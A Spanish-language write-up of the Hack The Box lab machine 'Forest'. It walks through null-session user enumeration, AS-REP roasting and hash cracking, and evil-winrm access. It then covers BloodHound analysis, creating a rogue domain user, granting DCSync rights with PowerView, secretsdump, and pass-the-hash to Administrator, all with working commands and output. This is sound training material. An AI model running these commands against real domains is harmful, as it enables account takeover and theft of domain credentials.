# Forest

![](../../../../~gitbook/image.md)Publicado: 20 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
###📝 Descripción
Forest es una máquina Windows de dificultad fácil que simula un entorno de Active Directory típico de una organización corporativa. La máquina presenta un controlador de dominio Windows Server 2016 con múltiples servicios expuestos, incluyendo LDAP, SMB, Kerberos y WinRM.El vector de ataque principal implica la explotación de configuraciones incorrectas en Active Directory, específicamente:- Enumeración de usuarios a través de conexiones nulas (null sessions) en SMB y LDAP
- AS-REP Roasting contra una cuenta de servicio sin pre-autenticación Kerberos
- Escalada de privilegios mediante la explotación de permisos de grupo en Exchange Windows Permissions
- DCSync para extraer credenciales del controlador de dominio
Esta máquina es ideal para practicar técnicas de pentesting en entornos de Active Directory, cubriendo desde la enumeración inicial hasta la escalada completa de privilegios a Domain Admin.
###🎯 Objetivos de Aprendizaje
- Enumeración de servicios en Active Directory
- Explotación de null sessions en SMB/LDAP
- Técnicas de AS-REP Roasting
- Uso de BloodHound para análisis de AD
- Escalada de privilegios mediante ACLs
- Ataques DCSync contra controladores de dominio

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
####📋 Análisis de Servicios Detectados
PuertoServicioDescripción53DNSServicio de nombres de dominio88KerberosAutenticación de dominio135RPCLlamadas a procedimientos remotos139/445SMBCompartición de archivos389/3268LDAPDirectorio activo5985WinRMAdministración remota PowerShell
###🌐 Enumeración de Servicios

####🗂️ 445 SMB
No tenemos credenciales, así que tratamos de enumerar recursos haciendo uso de una null sesion:Primero lo intentamos con la herramienta smbclient pero no obtenemos nadaTratamos de enumerar con el script de enum4linux y comenzamos a obtener información:👥 Usuarios Descubiertos🔐 Política de Contraseñas🏛️ Grupos de Dominio🔍 Enumeración de usuarios SMBTambién podemos tratar de enumerar usuarios usando netexec con los siguiente parámetros:![](../../../../~gitbook/image.md)🌐 Enumeración de usuarios LDAPRealizamos un proceso de numeración similar al anterior pero esta vez contra LDAP y al observar la salida, vemos un usuario nuevo que no teníamos con la anterior enumeración `svc_alfresco`![](../../../../~gitbook/image.md)
###🎯 Explotación Inicial

####🔑 AS-REP Roasting
Podemos verificar si existe algún usuario que no tenga habilitada la pre-autenticación de kerberos.🎯 Resultado clave: Encontramos que la cuenta `svc-alfresco` no tiene la pre-autenticación de kerberos activada y logramos obtener su hash AS-REP.
####💥 Cracking del Hash
Procedemos a crackear el hash obtenido:![](../../../../~gitbook/image.md)Alternativamente, usando hashcat:![](../../../../~gitbook/image.md)
####🏆 Credenciales Obtenidas

####🔓 Acceso Inicial
Verificamos si podemos autenticarnos con las credenciales obtenidas:![](../../../../~gitbook/image.md)Obtenemos acceso via WinRM:
####🚩 User Flag
Capturamos la primera flag en el directorio Desktop del usuario svc-alfresco:
###🔝 Escalada de Privilegios

####🩸 Análisis con BloodHound
Tras enumerar la máquina en busca de posibles vías de explotación, procedemos a usar BloodHound para un análisis más profundo. Subimos la herramienta SharpHound.exe para extraer la información de dominio:Una vez cargada la información en BloodHound, seleccionamos la cuenta del usuario svc-alfresco como "Owned Users" y analizamos las relaciones:![](../../../../~gitbook/image.md)
####🎯 Identificación de Ruta de Ataque
Utilizamos la siguiente consulta Cypher para encontrar el camino más corto hacia los administradores de dominio:![](../../../../~gitbook/image.md)
####🔓 Explotación de Permisos
El análisis revela que:- `svc-alfresco` es miembro de Account Operators
- Account Operators tiene control total (GenericAll) sobre el grupo Exchange Windows Permissions
- Exchange Windows Permissions tiene privilegios WriteDACL sobre el dominio

####👤 Creación de Usuario Malicioso
Aprovechamos estos permisos para crear un nuevo usuario y añadirlo a los grupos necesarios:Verificamos que se ha creado la cuenta y pertenece al grupo requerido:![](../../../../~gitbook/image.md)
####🛠️ Configuración de Privilegios DCSync
A continuación transferimos la herramienta [powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) al host :Ejecutamos el bypass de AMSI y otorgamos privilegios DCSync:
####💎 Extracción de Credenciales
Con el usuario john ahora teniendo privilegios DCSync, procedemos a extraer todas las credenciales del dominio:
####👑 Acceso como Administrator
Realizamos Pass-the-Hash con las credenciales del administrador:![](../../../../~gitbook/image.md)
####🏁 Root Flag
Con acceso de administrador, capturamos la flag final:Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Objetivos de Aprendizaje](#objetivos-de-aprendizaje)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🎯 Explotación Inicial](#explotacion-inicial)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=46.9 ms
64 bytes from 10.10.10.161: icmp_seq=2 ttl=127 time=44.2 ms

--- 10.10.10.161 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 44.173/45.553/46.934/1.380 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49684,49703,49951
```

```
nmap -sC -sV -p$ports 10.10.10.161 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 11:53 CEST
Nmap scan report for 10.10.10.161
Host is up (0.042s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-20 10:00:01Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49951/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-06-20T03:00:54-07:00
| smb2-time:
|   date: 2025-06-20T10:00:53
|_  start_date: 2025-06-20T09:44:43
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

```
echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.10.161
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
=======================================( Users on 10.10.10.161 )=======================================

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

```
============================( Password Policy Information for 10.10.10.161 )============================

[+] Attaching to 10.10.10.161 using a NULL share
[+] Trying protocol 445/SMB...
[+] Found domain(s):
[+] HTB
[+] Builtin

[+] Password Info for Domain: HTB
[+] Minimum password length: 7
[+] Password history length: 24
[+] Maximum password age: Not Set
[+] Password Complexity Flags: 000000
[+] Domain Refuse Password Change: 0
[+] Domain Password Store Cleartext: 0
[+] Domain Password Lockout Admins: 0
[+] Domain Password No Clear Change: 0
[+] Domain Password No Anon Change: 0
[+] Domain Password Complex: 0
[+] Minimum password age: 1 day 4 minutes
[+] Reset Account Lockout Counter: 30 minutes
[+] Locked Account Duration: 30 minutes
[+] Account Lockout Threshold: None
[+] Forced Log off Time: Not Set
```

```
=======================================( Groups on 10.10.10.161 )=======================================

[+] Getting builtin groups:

group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]
```

```
netexec smb 10.10.10.161 -u '' -p '' --users 2>/dev/null | awk '/^[A-Z]+[ \t]+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ && $5 !~ /\[|\+|\-|\*/ {print $5}' > smb_users.txt
```

```
netexec ldap 10.10.10.161 -u '' -p '' --users | grep 'LDAP' | grep -v '\[-\]' | grep -v '\[+\]' | grep -v '\[-Username-\]' | awk '{print $5}' > ldap_users.txt
```

```
impacket-GetNPUsers -dc-ip 10.10.10.161 HTB.LOCAL/ -no-pass -usersfile ldap_users.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:b6147468122bb0c2fcf582f7d9e5b177$879fb82bf5c6ecb99befb6ff2c1c3be61600880d7d0daf030b0b89be8f097cc00f95914ee85c446cef1805d00a6ca998d97552d96e619fe12203ccaccfb203db288854da8a02c0061197ec0345c2132d3ef42944b35ee667b17c3037059a85c68fcf7374e8c56d96103bdfb9b7aa7ffed296f8ff5cf76efbbe6bbb701b6bed8545d83fe9d5f3683dc2209bcf15328325c3ddee2c72802134789b0e0a71ba3c5b09f1c75be428ea7f2ee729d9b8bfedea75736672c811a529688f86c92cfb924ff5cea5f4b2f713509a62b8c1bb62a8a14066fa095ea67cf58d81153a8de3ceaaf425e3213451
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```
nth --text '$krb5asrep$23$svc-alfresco@HTB.LOCAL:b6147468122bb0c2fcf582f7d9e5b177$879fb82bf5c6ecb99befb6ff2c1c3be61600880d7d0daf030b0b89be8f097cc00f95914ee85c446cef1805d00a6ca998d97552d96e619fe12203ccaccfb203db288854da8a02c0061197ec0345c2132d3ef42944b35ee667b17c3037059a85c68fcf7374e8c56d96103bdfb9b7aa7ffed296f8ff5cf76efbbe6bbb701b6bed8545d83fe9d5f3683dc2209bcf15328325c3ddee2c72802134789b0e0a71ba3c5b09f1c75be428ea7f2ee729d9b8bfedea75736672c811a529688f86c92cfb924ff5cea5f4b2f713509a62b8c1bb62a8a14066fa095ea67cf58d81153a8de3ceaaf425e3213451'
```

```
hashcat -m 18200 -a 0 alfresco_hash /usr/share/wordlists/rockyou.txt
```

```
svc-alfresco:s3rvice
```

```
netexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir

Directory: C:\Users\svc-alfresco\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/20/2025   2:45 AM             34 user.txt
```

```
*Evil-WinRM* PS C:\Temp> .\SharpHound.exe -c All --zipfilename FOREST
```

```
MATCH p=shortestPath((n:User)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(m:Group))
WHERE n.enabled = True AND m.objectid ENDS WITH "-512"
RETURN p
```

```
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net group "Remote Management Users" john /add
```

```
# En el host atacante
python3 -m http.server 80
```

```
# En la máquina víctima
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload PowerView.ps1
Import-Module .\PowerView.ps1
Menu
```

```
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john',$pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

```
impacket-secretsdump htb/john@10.10.10.161
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:
[*] Cleaning up...
```

```
evil-winrm -i 10.10.10.161 -u Administrator -H ''
```

```
type C:\Users\Administrator\Desktop\root.txt
```
